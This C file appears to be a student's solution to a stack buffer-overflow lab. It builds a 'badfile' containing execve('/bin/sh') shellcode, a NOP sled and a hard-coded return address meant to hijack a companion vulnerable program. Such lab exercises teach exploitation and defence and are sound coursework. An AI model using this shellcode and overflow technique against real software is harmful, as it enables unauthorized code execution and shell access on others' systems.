/* student_code.c  */

/* A program that creates a file containing code for launching shell*/
/* Student needs to supply the code here for creating the file */
/* When stack.c is used with this file the bufferoverflow should be triggered */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[] =
"\x31\xc0"             /* xorl    %eax,%eax              */
"\x50"                 /* pushl   %eax                   */
"\x68""//sh"           /* pushl   $0x68732f2f            */
"\x68""/bin"           /* pushl   $0x6e69622f            */
"\x89\xe3"             /* movl    %esp,%ebx              */
"\x50"                 /* pushl   %eax                   */
"\x53"                 /* pushl   %ebx                   */
"\x89\xe1"             /* movl    %esp,%ecx              */
"\x99"                 /* cdq                            */
"\xb0\x0b"             /* movb    $0x0b,%al              */
"\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char** argv)
{
    char buffer[517];
    FILE* badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    int length = strlen(shellcode);
    int start = 517 - length;
    int value = 0xbfffeb08 + 0x88;
    printf("Benis! 2\n");
    int offset = 36;

    for (int i = 0; i < length; i++) {
        buffer[start + i] = shellcode[i];
    }

    //Buffer[offset] = value
    //char *ptr_offset = buffer + offset; also actually works
    int* ptr_offset = (int*)&buffer[offset];
    *ptr_offset = value;

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}